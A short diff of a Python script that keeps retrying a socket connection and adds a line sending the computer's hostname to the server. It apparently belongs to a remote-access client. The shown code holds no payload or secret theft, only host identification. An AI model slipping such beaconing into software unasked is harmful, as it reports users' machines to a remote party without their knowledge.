@@ -43,6 +43,8 @@ while True:  # infinite loop until socket can connect
         time.sleep(5)  # wait 5 seconds to try again
     else: break
 
+objSocket.send(str.encode(socket.gethostname()))  # send computer name to server
+
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
 
